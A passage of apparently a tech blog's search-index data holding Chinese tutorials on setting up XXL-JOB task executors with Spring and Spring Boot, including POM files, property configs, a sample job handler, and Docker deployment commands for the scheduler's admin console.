"random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 开发随笔"},{title:"XXL-JOB 入门教程之二",url:"/posts/972c1f90.html",text:'大纲 XXL-JOB 入门教程之一 XXL-JOB 入门教程之二 前言 XXL 官方开源社区 XXL-JOB 官方文档 XXL-JOB 官方项目 体系架构XXL-JOB 框架中包含了两个核心模块：调度中心和执行器，其中调度中心（服务端）主要负责任务的调度，而执行器（客户端）负责任务的执行。v2.1.0 版本的架构图如下： 术语解释 术语 描述 执行器 真正执行调度任务的应用（客户端） 路由策略 路由的选择方式，即调度任务的分配规则，使用分片广播时，需要结合代码使用 Cron 定时任务的触发时间规则 运行模式 - Bean：执行器要执行指定的 Bean 对象的方式 - GLUE (Java)：以源码的方式来维护调度中心，相当于就是将调度中心变成一个执行器，每次调用运行指定的脚本 JobHandler 执行器执行的业务逻辑（调度任务） 子任务 ID 当前任务执行完之后，下一个所要执行任务的 ID（支持多个子任务） 任务超时时间 当执行任务的时间大于规定时间时，就算任务超时 阻塞处理策略 任务调度过于密集，执行器来不及处理时的处理策略，一共有三种阻塞处理策略- 单机串行：按顺序一个一个地执行完任务 - 丢弃后续调度：执行前一个任务，后面的调度任务全部丢弃，直到前一个任务执行完成 - 覆盖之前调度：后一个任务去覆盖前一个任务，前一个任务不再执行 代码下载本文的案例代码都可以在 这里 下载得到，直接作为 Maven 项目导入到 IDEA 或者 Eclipse 即可。 XXL-JOB 介绍调度中心的核心模块 模块名称 说明 定时模块 Scheduled 定时去获取任务调度的数据，数据存储在数据库中 路由模块 Route 一定的路由规则，负责计算出要指定的执行器 远程调用 RPC 通过远程调用执行执行器，将远程调用的信息发给执行器，信息包括哪个执行器，哪个任务 提示：执行器（客户端）中也有一个 RPC 用于通信，负责接收任务。 调度中心的执行流程 1、启动服务，将执行器注册到调度中心（注意每 30s 重新注册到调度中心） 2、在数据库中存储着执行器的数据，也可以手动地去录入执行器 3、配置调度中心、定时调度、配置路由规则 4、远程调用指定的执行器实例，找到对应的任务进行调用 调度中心的设计思想 将调度行为抽象形成 “调度中心” 公共平台，而平台自身并不承担业务逻辑，” 调度中心” 负责发起调度请求。 将任务抽象成分散的 JobHandler，交由 “执行器” 统一管理，” 执行器” 负责接收调度请求并执行对应的 JobHandler 中业务逻辑。因此，” 调度” 和 “任务” 两部分可以相互解耦，提高系统整体稳定性和扩展性。 调度模块（调度中心）：负责管理调度信息，按照调度配置发出调度请求，自身不承担业务代码。调度系统与任务解耦，提高了系统可用性和稳定性，同时调度系统性能不再受限于任务模块。 支持可视化、简单且动态的管理调度信息，包括任务新建、更新、删除、GLUE 开发和任务报警等，所有上述操作都会实时生效，同时支持监控调度结果以及执行日志，支持执行器 Failover。 执行模块（执行器）：负责接收调度请求并执行任务逻辑，任务模块专注于任务的执行等操作，开发和维护更简单和高效；接收 “调度中心” 的执行请求、终止请求和日志请求等。 提示：调度中心大体的架构设计图可查看 这里。 快速入门案例创建 POM 模块为了后续方便管理多个子模块，这里先创建 Maven 的 POM 模块 xxl-job-study，XML 配置文件的内容如下： 1234567891011121314151617181920212223&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.clay&lt;/groupId&gt; &lt;artifactId&gt;xxl-job-study&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;modules&gt; &lt;module&gt;xxl-job-executor-spring&lt;/module&gt; &lt;module&gt;xxl-job-executor-springboot&lt;/module&gt; &lt;/modules&gt;&lt;/project&gt; 基于 Spring 开发框架版本说明 框架 版本 Spring 5.3.23 XXL-JOB 2.4.0 项目目录结构 创建 Maven 子模块在 Maven 的 POM 模块中创建子模块 xxl-job-executor-spring，XML 配置文件的内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.clay&lt;/groupId&gt; &lt;artifactId&gt;xxl-job-study&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;artifactId&gt;xxl-job-executor-spring&lt;/artifactId&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;!-- xxl-job-core --&gt; &lt;dependency&gt; &lt;groupId&gt;com.xuxueli&lt;/groupId&gt; &lt;artifactId&gt;xxl-job-core&lt;/artifactId&gt; &lt;version&gt;2.4.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- spring-mvc --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.3.23&lt;/version&gt; &lt;/dependency&gt; &lt;!-- logback --&gt; &lt;dependency&gt; &lt;groupId&gt;org.logback-extensions&lt;/groupId&gt; &lt;artifactId&gt;logback-ext-spring&lt;/artifactId&gt; &lt;version&gt;0.1.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;jcl-over-slf4j&lt;/artifactId&gt; &lt;version&gt;1.7.25&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt; &lt;version&gt;3.3.2&lt;/version&gt; &lt;configuration&gt; &lt;archiveClasses&gt;false&lt;/archiveClasses&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 创建项目的配置文件创建执行器的配置文件在子模块的 /src/main/resources 目录下创建 xxl-job-executor.properties 配置文件。 123456789101112131415161718### 调度中心部署根地址 [选填]：如调度中心集群部署存在多个地址则用逗号分隔。执行器将会使用该地址进行"执行器心跳注册"和"任务结果回调"；为空则关闭自动注册；xxl.job.admin.addresses=http://127.0.0.1:8080/xxl-job-admin### 执行器通讯TOKENxxl.job.accessToken=default_token### 执行器AppName [选填]：执行器心跳注册分组依据；为空则关闭自动注册xxl.job.executor.appname=xxl-job-executor-spring### 执行器注册 [选填]：优先使用该配置作为注册地址，为空时使用内嵌服务 ”IP:PORT“ 作为注册地址。从而更灵活的支持容器类型执行器动态IP和动态映射端口问题。xxl.job.executor.address=### 执行器IP [选填]：默认为空表示自动获取IP，多网卡时可手动设置指定IP，该IP不会绑定Host仅作为通讯实用；地址信息用于 "执行器注册" 和 "调度中心请求并触发任务"；xxl.job.executor.ip=### 执行器端口号 [选填]：小于等于0则自动获取；默认端口为9999，单机部署多个执行器时，注意要配置不同执行器端口；xxl.job.executor.port=9999### 执行器运行日志文件存储磁盘路径 [选填] ：需要对该路径拥有读写权限；为空则使用默认路径；xxl.job.executor.logpath=/data/applogs/xxl-job/jobhandler### 执行器日志文件保存天数 [选填] ： 过期日志自动清理, 限制值大于等于3时生效; 否则, 如-1, 关闭自动清理功能；xxl.job.executor.logretentiondays=30 参数名称 参数说明 xxl.job.executor.appname 执行器的名称，建议使用 Maven 模块的名称 xxl.job.executor.address 执行器的注册地址，使用新版本（如 v2.4.0）时，必须带 HTTP/HTTPS 协议头，例如 http://127.0.0.1:9999 xxl.job.accessToken XXL-JOB 的访问令牌，只有调度中心和执行器双方的 AccessToken 互相匹配才允许通讯 特别注意 XXL-JOB 从 v.2.3.1 版本开始，调度通讯默认启用 AccessToken，且默认的 AccessToken 是 default_token。 创建 Spring 的配置文件在子模块的 /src/main/resources 目录下创建 applicationcontext-xxl-job.xml 配置文件，这里主要需要指定 JobHandler 的扫描路径。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd"&gt; &lt;!-- 读取执行器的配置信息 --&gt; &lt;bean id="propertyConfigurer" class="org.springframework.context.support.PropertySourcesPlaceholderConfigurer"&gt; &lt;property name="fileEncoding" value="utf-8"/&gt; &lt;property name="locations"&gt; &lt;list&gt; &lt;value&gt;classpath*:xxl-job-executor.properties&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;!-- 配置01、JobHandler 扫描路径 --&gt; &lt;context:component-scan base-package="com.clay.job.executor"/&gt; &lt;!-- 配置02、执行器 --&gt; &lt;bean id="xxlJobSpringExecutor" class="com.xxl.job.core.executor.impl.XxlJobSpringExecutor"&gt; &lt;!-- 执行器注册中心地址[选填]，为空则关闭自动注册 --&gt; &lt;property name="adminAddresses" value="${xxl.job.admin.addresses}"/&gt; &lt;!-- 访问令牌[选填]，非空则进行匹配校验 --&gt; &lt;property name="accessToken" value="${xxl.job.accessToken}"/&gt; &lt;!-- 执行器AppName[选填]，为空则关闭自动注册 --&gt; &lt;property name="appname" value="${xxl.job.executor.appname}"/&gt; &lt;!-- 注册地址[选填]，优先使用该配置作为注册地址，为空时使用内嵌服务 ”IP:PORT“ 作为注册地址 --&gt; &lt;property name="address" value="${xxl.job.executor.address}"/&gt; &lt;!-- 执行器IP[选填]，为空则自动获取 --&gt; &lt;property name="ip" value="${xxl.job.executor.ip}"/&gt; &lt;!-- 执行器端口号[选填]，小于等于0则自动获取 --&gt; &lt;property name="port" value="${xxl.job.executor.port}"/&gt; &lt;!-- 执行器日志路径[选填]，为空则使用默认路径 --&gt; &lt;property name="logPath" value="${xxl.job.executor.logpath}"/&gt; &lt;!-- 日志保存天数[选填]，值大于3时生效 --&gt; &lt;property name="logRetentionDays" value="${xxl.job.executor.logretentiondays}"/&gt; &lt;/bean&gt;&lt;/beans&gt; 创建 Logback 的配置文件在子模块的 /src/main/resources 目录下创建 logback.xml 配置文件。 1234567891011121314151617181920212223242526272829&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;configuration debug="false" scan="true" scanPeriod="1 seconds"&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;property name="log.path" value="/data/applogs/xxl-job/xxl-job-executor-spring.log"/&gt; &lt;appender name="console" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder&gt; &lt;pattern&gt;%d{HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36} - %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name="file" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;file&gt;${log.path}&lt;/file&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}.%d{yyyy-MM-dd}.zip&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%date %level [%thread] %logger{36} [%file : %line] %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;root level="info"&gt; &lt;appender-ref ref="console"/&gt; &lt;appender-ref ref="file"/&gt; &lt;/root&gt;&lt;/configuration&gt; 创建 Web 容器的配置文件在子模块的 /src/main/webapp/WEB-INF 目录下创建 web.xml 配置文件。 12345678910111213141516171819202122232425262728293031323334353637&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" id="WebApp_ID" version="2.5"&gt; &lt;display-name&gt;xxl-job-executor-spring&lt;/display-name&gt; &lt;context-param&gt; &lt;param-name&gt;webAppRootKey&lt;/param-name&gt; &lt;param-value&gt;xxl-job-executor-spring&lt;/param-value&gt; &lt;/context-param&gt; &lt;!-- spring --&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath*:applicationcontext-*.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;!-- logback --&gt; &lt;context-param&gt; &lt;param-name&gt;logbackConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:logback.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;listener&gt; &lt;listener-class&gt;ch.qos.logback.ext.spring.web.LogbackConfigListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;index.html&lt;/welcome-file&gt; &lt;/welcome-file-list&gt; &lt;/web-app&gt; 创建自定义的执行器类123456789101112131415161718192021222324252627282930313233343536373839404142package com.clay.job.executor;import com.xxl.job.core.context.XxlJobHelper;import com.xxl.job.core.handler.annotation.XxlJob;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.stereotype.Component;import java.util.concurrent.TimeUnit;/** * * XxlJob 执行器开发示例（Bean模式） * * 开发步骤： * 1、任务开发：在Spring Bean实例中，开发Job方法； * 2、注解配置：为Job方法添加注解 "@XxlJob(value="自定义jobhandler名称", init = "JobHandler初始化方法", destroy = "JobHandler销毁方法")"，注解value值对应的是调度中心新建任务的JobHandler属性的值。 * 3、执行日志：需要通过 "XxlJobHelper.log" 打印执行日志； * 4、任务结果：默认任务结果为 "成功" 状态，不需要主动设置；如有诉求，比如设置任务结果为失败，可以通过 "XxlJobHelper.handleFail/handleSuccess" 自主设置任务结果； * * @author clay */@Componentpublic class CustomJobExecutor { private static final Logger logger = LoggerFactory.getLogger(CustomJobExecutor.class); /** * 简单任务示例（Bean模式） */ @XxlJob(value = "sampleJobHandler") public void sampleJobHandler() throws Exception { XxlJobHelper.log("XXL-JOB, Hello World."); for (int i = 0; i &lt; 5; i++) { XxlJobHelper.log("beat at:" + i); TimeUnit.SECONDS.sleep(2); } XxlJobHelper.handleSuccess(); }} 部署应用到 Tomcat 服务器 测试任务调度代码启动调度中心服务 IDEA 运行 XXL-JOB 调度中心 Docker 安装 XXL-JOB 调度中心 调度中心添加执行器登录 XXL-JOB 调度中心的管理页面，添加自定义的执行器信息，这里的 AppName 是在 xxl-job-executor.properties 配置文件中使用 xxl.job.executor.appname 参数指定的。 确定执行器自动注册成功 ，添加执行器后一般需要等待 10 秒左右。 特别注意 XXL-JOB 使用新版本（如 v2.4.0）时，如果添加执行器选择的是手动录入模式，那么此时填写的机器地址必须是带 HTTP/HTTPS 协议头（例如 http://127.0.0.1:9999），否则后续添加的调度任务无法正常执行。 调度中心添加调度任务这里的 JobHandler 配置内容，是在自定义的执行器类里使用 @XxlJob 注解的 value 属性指定。 调度中心启动调度任务 查看任务调度日志信息 基于 SpringBoot 开发框架版本说明 框架 版本 Spring Boot 2.7.9 XXL-JOB 2.4.0 项目目录结构 创建 Maven 子模块在 Maven 的 POM 模块中创建子模块 xxl-job-executor-springboot，XML 配置文件的内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.clay&lt;/groupId&gt; &lt;artifactId&gt;xxl-job-study&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;artifactId&gt;xxl-job-executor-springboot&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;xxl-job.version&gt;2.4.0&lt;/xxl-job.version&gt; &lt;spring-boot.version&gt;2.7.9&lt;/spring-boot.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!-- xxl-job-core --&gt; &lt;dependency&gt; &lt;groupId&gt;com.xuxueli&lt;/groupId&gt; &lt;artifactId&gt;xxl-job-core&lt;/artifactId&gt; &lt;version&gt;${xxl-job.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- spring-webmvc + tomcat --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- test --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;${spring-boot.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${spring-boot.version}&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 编写 Java 项目代码创建应用的主启动类12345678910111213141516package com.clay.job.executor;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;/** * @author clay */@SpringBootApplicationpublic class XxlJobExecutorApplication { public static void main(String[] args) { SpringApplication.run(XxlJobExecutorApplication.class, args); }} 创建 XXL-JOB 的配置类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package com.clay.job.executor.config;import com.xxl.job.core.executor.impl.XxlJobSpringExecutor;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.beans.factory.annotation.Value;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;/** * @author clay */@Configurationpublic class XxlJobConfig { private static final Logger logger = LoggerFactory.getLogger(XxlJobConfig.class); @Value("${xxl.job.admin.addresses}") private String adminAddresses; @Value("${xxl.job.accessToken}") private String accessToken; @Value("${xxl.job.executor.appname}") private String appname; @Value("${xxl.job.executor.address}") private String address; @Value("${xxl.job.executor.ip}") private String ip; @Value("${xxl.job.executor.port}") private int port; @Value("${xxl.job.executor.logpath}") private String logPath; @Value("${xxl.job.executor.logretentiondays}") private int logRetentionDays; @Bean public XxlJobSpringExecutor xxlJobExecutor() { logger.info("&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; xxl-job config init."); XxlJobSpringExecutor xxlJobSpringExecutor = new XxlJobSpringExecutor(); xxlJobSpringExecutor.setAdminAddresses(adminAddresses); xxlJobSpringExecutor.setAppname(appname); xxlJobSpringExecutor.setAddress(address); xxlJobSpringExecutor.setIp(ip); xxlJobSpringExecutor.setPort(port); xxlJobSpringExecutor.setAccessToken(accessToken); xxlJobSpringExecutor.setLogPath(logPath); xxlJobSpringExecutor.setLogRetentionDays(logRetentionDays); return xxlJobSpringExecutor; } /** * 针对多网卡、容器内部署等情况，可借助 "spring-cloud-commons" 提供的 "InetUtils" 组件灵活定制注册IP； * * 1、引入依赖： * &lt;dependency&gt; * &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; * &lt;artifactId&gt;spring-cloud-commons&lt;/artifactId&gt; * &lt;version&gt;${version}&lt;/version&gt; * &lt;/dependency&gt; * * 2、配置文件，或者容器启动变量 * spring.cloud.inetutils.preferred-networks: \'xxx.xxx.xxx.\' * * 3、获取IP * String ip_ = inetUtils.findFirstNonLoopbackHostInfo().getIpAddress(); */} 创建 XXL-JOB 的执行器类123456789101112131415161718192021222324252627282930313233343536373839404142package com.clay.job.executor.jobhandler;import com.xxl.job.core.context.XxlJobHelper;import com.xxl.job.core.handler.annotation.XxlJob;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.stereotype.Component;import java.util.concurrent.TimeUnit;/** * * XxlJob 执行器开发示例（Bean模式） * * 开发步骤： * 1、任务开发：在Spring Bean实例中，开发Job方法； * 2、注解配置：为Job方法添加注解 "@XxlJob(value="自定义jobhandler名称", init = "JobHandler初始化方法", destroy = "JobHandler销毁方法")"，注解value值对应的是调度中心新建任务的JobHandler属性的值。 * 3、执行日志：需要通过 "XxlJobHelper.log" 打印执行日志； * 4、任务结果：默认任务结果为 "成功" 状态，不需要主动设置；如有诉求，比如设置任务结果为失败，可以通过 "XxlJobHelper.handleFail/handleSuccess" 自主设置任务结果； * * @author clay */@Componentpublic class CustomJobExecutor { private static final Logger logger = LoggerFactory.getLogger(CustomJobExecutor.class); /** * 简单任务示例（Bean模式） */ @XxlJob(value = "sampleJobHandler") public void sampleJobHandler() throws Exception { XxlJobHelper.log("XXL-JOB, Hello World."); for (int i = 0; i &lt; 5; i++) { XxlJobHelper.log("beat at:" + i); TimeUnit.SECONDS.sleep(2); } XxlJobHelper.handleSuccess(); }} 创建项目配置文件创建日志配置文件1234567891011121314151617181920212223242526272829&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;configuration debug="false" scan="true" scanPeriod="1 seconds"&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;property name="log.path" value="/data/applogs/xxl-job/xxl-job-executor-springboot.log"/&gt; &lt;appender name="console" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder&gt; &lt;pattern&gt;%d{HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36} - %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name="file" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;file&gt;${log.path}&lt;/file&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}.%d{yyyy-MM-dd}.zip&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%date %level [%thread] %logger{36} [%file : %line] %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;root level="info"&gt; &lt;appender-ref ref="console"/&gt; &lt;appender-ref ref="file"/&gt; &lt;/root&gt;&lt;/configuration&gt; 创建 SpringBoot 配置文件123456789101112131415161718192021222324# 端口server.port=8089# 日志配置logging.config=classpath:logback.xml### 调度中心部署根地址 [选填]：如调度中心集群部署存在多个地址则用逗号分隔。执行器将会使用该地址进行"执行器心跳注册"和"任务结果回调"；为空则关闭自动注册；xxl.job.admin.addresses=http://127.0.0.1:8080/xxl-job-admin### 执行器通讯TOKENxxl.job.accessToken=default_token### 执行器AppName [选填]：执行器心跳注册分组依据；为空则关闭自动注册xxl.job.executor.appname=xxl-job-executor-springboot### 执行器注册 [选填]：优先使用该配置作为注册地址，为空时使用内嵌服务 ”IP:PORT“ 作为注册地址。从而更灵活的支持容器类型执行器动态IP和动态映射端口问题。xxl.job.executor.address=### 执行器IP [选填]：默认为空表示自动获取IP，多网卡时可手动设置指定IP，该IP不会绑定Host仅作为通讯实用；地址信息用于 "执行器注册" 和 "调度中心请求并触发任务"；xxl.job.executor.ip=### 执行器端口号 [选填]：小于等于0则自动获取；默认端口为9999，单机部署多个执行器时，注意要配置不同执行器端口；xxl.job.executor.port=9999### 执行器运行日志文件存储磁盘路径 [选填] ：需要对该路径拥有读写权限；为空则使用默认路径；xxl.job.executor.logpath=/data/applogs/xxl-job/jobhandler### 执行器日志文件保存天数 [选填] ： 过期日志自动清理, 限制值大于等于3时生效; 否则, 如-1, 关闭自动清理功能；xxl.job.executor.logretentiondays=30 参数名称 参数说明 xxl.job.executor.appname 执行器的名称，建议使用 Maven 模块的名称 xxl.job.executor.address 执行器的注册地址，使用新版本（如 v2.4.0）时，必须带 HTTP/HTTPS 协议头，例如 http://127.0.0.1:9999 xxl.job.accessToken XXL-JOB 的访问令牌，只有调度中心和执行器双方的 AccessToken 互相匹配才允许通讯 特别注意 XXL-JOB 从 v.2.3.1 版本开始，调度通讯默认启用 AccessToken，且默认的 AccessToken 是 default_token。 测试任务调度代码启动调度中心服务 IDEA 运行 XXL-JOB 调度中心 Docker 安装 XXL-JOB 调度中心 调度中心添加执行器登录 XXL-JOB 调度中心的管理页面，添加自定义的执行器信息，这里的 AppName 是在 application.properties 配置文件中使用 xxl.job.executor.appname 参数指定的。 确定执行器自动注册成功 ，添加执行器后一般需要等待 10 秒左右。 特别注意 XXL-JOB 使用新版本（如 v2.4.0）时，如果添加执行器选择的是手动录入模式，那么此时填写的机器地址必须是带 HTTP/HTTPS 协议头（例如 http://127.0.0.1:9999），否则后续添加的调度任务无法正常执行。 调度中心添加调度任务这里的 JobHandler 配置内容，是在自定义的执行器类里使用 @XxlJob 注解的 value 属性指定。 调度中心启动调度任务 查看任务调度日志信息 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"Docker 安装 XXL-JOB",url:"/posts/b7f83596.html",text:'前言 XXL 官方开源社区 XXL-JOB 官方文档 XXL-JOB 官方项目 初始化数据库在 MySQL 执行 XXL-JOB GitHub 仓库中的 SQL 初始化脚本，初始化完成后一共有 8 张表。 表名称 描述 xxl_job_group 执行器信息表，用于维护任务执行器的信息 xxl_job_info 调度扩展信息表，用于存储调度任务的扩展信息，比如任务分组、任务名、机器的地址等 xxl_job_lock 任务调度锁表 xxl_job_log 日志表，用于存储任务调度的历史信息，例如调度结果、执行结果、调度入参等 xxl_job_log_report 日志报表，用于存储任务调度的日志报表，会在调度中心里的报表功能里使用到 xxl_job_logglue 任务的 GLUE 日志，用于存储 GLUE 日志的更新历史变化，支持 GLUE 版本的回溯功能 xxl_job_registry 执行器的注册表，用在维护在线的执行器与调度中心的地址信息 xxl_job_user 系统的用户表，可以用表中默认的用户名与密码进行登录 XXL-JOB 安装拉取镜像12345# 最新版本$ docker pull xuxueli/xxl-job-admin# 或者指定版本号（推荐）$ docker pull xuxueli/xxl-job-admin:2.3.1 启动容器监听端口XXL-JOB 启动后默认会监听 8080 端口，用于 Admin 的 HTTP 服务。 自定义参数 GitHub 仓库中的配置项参考文件：/xxl-job/xxl-job-admin/src/main/resources/application.properties 如需自定义 JVM 内存参数等配置，可通过 Docker 的 -e JAVA_OPTS 指定，参数格式 -e JAVA_OPTS="-Xmx512m" 如需自定义 MySQL 等配置，可通过 Docker 的 -e PARAMS 指定，参数格式 -e PARAMS="--key=value --key2=value2" Docker 启动12345docker run -e PARAMS="--server.port=8080 --spring.datasource.url=jdbc:mysql://127.0.0.1:3306/xxl_job?characterEncoding=UTF-8&amp;autoReconnect=true&amp;allowMultiQueries=true&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai --spring.datasource.username=root --spring.datasource.password=root --xxl.job.accessToken=default_token" \\-p 8080:8080 \\-v /tmp/logs:/data/applogs \\--name xxl-job-admin \\-d xuxueli/xxl-job-admin:2.3.1 请自行更改 MySQL 数据库的连接信息，例如 IP、用户名和密码。 Docker-Compose 启动12345678910111213version: \'3.5\'services: xxl-job: image: xuxueli/xxl-job-admin:2.3.1 container_name: xxl-job-admin restart: always volumes: - /tmp/logs:/data/applogs environment: - "PARAMS=--server.port=8080 --spring.datasource.url=jdbc:mysql://127.0.0.1:3306/xxl_job?characterEncoding=UTF-8&amp;autoReconnect=true&amp;allowMultiQueries=true&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai --spring.datasource.username=root --spring.datasource.password=root --xxl.job.accessToken=default_token" 